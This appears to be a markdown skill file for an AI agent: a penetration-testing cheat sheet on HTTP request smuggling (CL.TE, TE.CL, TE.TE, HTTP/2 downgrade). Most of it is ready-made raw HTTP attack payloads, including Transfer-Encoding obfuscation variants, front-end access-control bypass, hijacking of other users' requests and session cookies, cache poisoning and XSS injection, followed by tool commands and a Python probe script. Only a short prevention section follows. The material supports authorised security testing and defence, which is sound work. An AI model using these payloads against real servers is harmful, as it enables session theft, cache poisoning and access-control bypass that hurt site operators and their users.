---
name: request-smuggling
description: HTTP request smuggling - CL.TE, TE.CL, HTTP/2 desync attacks. Use for proxy/CDN testing.
---

# HTTP Request Smuggling

## Description
HTTP Request Smuggling exploits discrepancies in how front-end and back-end servers parse HTTP requests, particularly regarding the Content-Length and Transfer-Encoding headers. This can lead to request hijacking, cache poisoning, and bypassing security controls.

## How It Works

Front-end and back-end servers may disagree on where one request ends and another begins:
- **Content-Length (CL)**: Specifies body length in bytes
- **Transfer-Encoding (TE)**: Uses chunked encoding

## Vulnerability Types

### CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

### TE.TE (Both use Transfer-Encoding, but can be obfuscated)
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Transfer-encoding: x

0

SMUGGLED
```

## Detection Techniques

### Time-Based Detection

#### CL.TE Detection
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```
If vulnerable, back-end waits for next chunk (timeout).

#### TE.CL Detection
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
If vulnerable, back-end processes immediately (no timeout).

### Differential Response Detection
```http
POST /search HTTP/1.1
Host: target.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```
Second request (from another user) receives 404.

## Transfer-Encoding Obfuscation

### Header Variations
```http
Transfer-Encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
Transfer-Encoding:
 chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
 : chunked
```

### Case Variations
```http
Transfer-encoding: chunked
TRANSFER-ENCODING: chunked
Transfer-Encoding: CHUNKED
```

### Duplicate Headers
```http
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding: chunked
Transfer-Encoding: identity
```

## Exploitation Payloads

### CL.TE Basic
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X: X
```

### TE.CL Basic
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### Bypass Front-End Security
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```

### Request Hijacking
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: vulnerable.com
Cookie: session=ATTACKER_SESSION
Content-Length: 800

comment=
```
Next user's request is captured as comment.

### XSS via Request Smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
Host: vulnerable.com
User-Agent: "><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=
```

### Cache Poisoning
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 139
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: vulnerable.com
Content-Length: 10

x=<script>alert(1)</script>
```

## HTTP/2 Request Smuggling

### H2.CL (HTTP/2 to HTTP/1.1 with CL)
```
:method: POST
:path: /
:authority: vulnerable.com
content-length: 0

GET /admin HTTP/1.1
Host: vulnerable.com

```

### H2.TE (HTTP/2 with injected TE header)
```
:method: POST
:path: /
:authority: vulnerable.com
transfer-encoding: chunked

0

SMUGGLED
```

### CRLF Injection in HTTP/2
```
:method: POST
:path: /
:authority: vulnerable.com
foo: bar\r\nTransfer-Encoding: chunked

0

SMUGGLED
```

## Tools

### Burp Suite HTTP Request Smuggler
```
1. Install from BApp Store
2. Right-click request > Extensions > HTTP Request Smuggler
3. Run "Smuggle probe"
```

### Smuggler (Python)
```bash
# https://github.com/defparam/smuggler

python3 smuggler.py -u https://target.com

# With custom headers
python3 smuggler.py -u https://target.com -x "Header: value"
```

### h2csmuggler
```bash
# HTTP/2 cleartext smuggling
python3 h2csmuggler.py -x https://target.com
```

### Simple Probe Script
```python
import socket

def test_clte(host, port):
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "X"
    )

    sock = socket.socket()
    sock.connect((host, port))
    sock.send(payload.encode())
    response = sock.recv(4096)
    sock.close()
    return response
```

## Testing Methodology

### 1. Identify Target
```
- Look for CDN/reverse proxy setups
- Check for multiple server headers
- Test HTTP/1.1 and HTTP/2 support
```

### 2. Probe for Vulnerability
```
- Send CL.TE timing probe
- Send TE.CL timing probe
- Try Transfer-Encoding obfuscation
```

### 3. Confirm with Differential Response
```
- Smuggle request that causes different response
- Use innocuous requests first
```

### 4. Exploit
```
- Bypass access controls
- Poison cache
- Hijack requests
- Steal credentials
```

## Prevention

### Server Configuration
```
- Normalize requests at front-end
- Reject ambiguous requests
- Use HTTP/2 end-to-end
- Disable back-end connection reuse
```

### Web Server Settings
```nginx
# Nginx - reject ambiguous requests
proxy_request_buffering on;
```

```apache
# Apache - strict parsing
HttpProtocolOptions Strict
```

## Testing Checklist

- [ ] Test CL.TE with timing
- [ ] Test TE.CL with timing
- [ ] Try Transfer-Encoding obfuscation variants
- [ ] Test HTTP/2 downgrade smuggling
- [ ] Check for CRLF injection in headers
- [ ] Verify with differential responses
- [ ] Test cache poisoning potential
- [ ] Test for request hijacking

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling
- https://portswigger.net/web-security/request-smuggling
- https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
